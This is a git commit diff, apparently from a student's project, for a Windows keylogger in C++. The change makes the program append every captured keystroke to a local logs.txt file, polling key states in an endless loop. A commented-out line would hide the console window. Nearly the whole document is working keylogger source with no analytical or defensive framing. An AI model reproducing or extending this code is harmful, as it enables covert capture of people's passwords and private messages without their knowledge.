cfaeb7219fdc9771ee06ca4025abfb4f52a752e7
jon-lamoureux <jlamoureux@stetson.edu>
2022-11-05 23:53:39 -0400

    Added ability to write to file

--- keylogger.cpp
+++ keylogger.cpp
@@ -8,33 +8,36 @@ int main() {
     //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
 
     // Run infinitely
+    
+	std::fstream file;
     while(true) {
 		for (int key = 8; key <= 190; key++)
 		{    
             // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
             if (GetAsyncKeyState(key) == -32767) {
-                std::cout << key;
+                file.open("logs.txt", std::fstream::app);
                 if (key == VK_SHIFT) {
-                    std::cout << "[SHIFT]";
+                    file << "[SHIFT]";
                 } else if (key == VK_CAPITAL) {
-                    std::cout << "[CAPS]";
+                    file << "[CAPS]";
                 } else if (key == VK_SPACE) {
-                    std::cout << "[SPACE]";
+                    file << "[SPACE]";
                 } else if (key == VK_TAB) {
-                    std::cout << "[TAB]";
+                    file << "[TAB]";
                 } else if (key == VK_OEM_PERIOD) {
-                    std::cout << ".";
+                    file << ".";
                 } else if (key == VK_OEM_4) {
-                    std::cout << "[";
+                    file << "[";
                 }  else if (key == VK_OEM_6) {
-                    std::cout << "]";
+                    file << "]";
                 } else if (key == VK_OEM_PLUS) {
-                    std::cout << "+";
+                    file << "+";
                 } else if (key == VK_OEM_MINUS) {
-                    std::cout << "-";
+                    file << "-";
                 } else {
-                    std::cout << char(key);
+                    file << char(key);
                 }
+                file.close();
             }
         }
     }
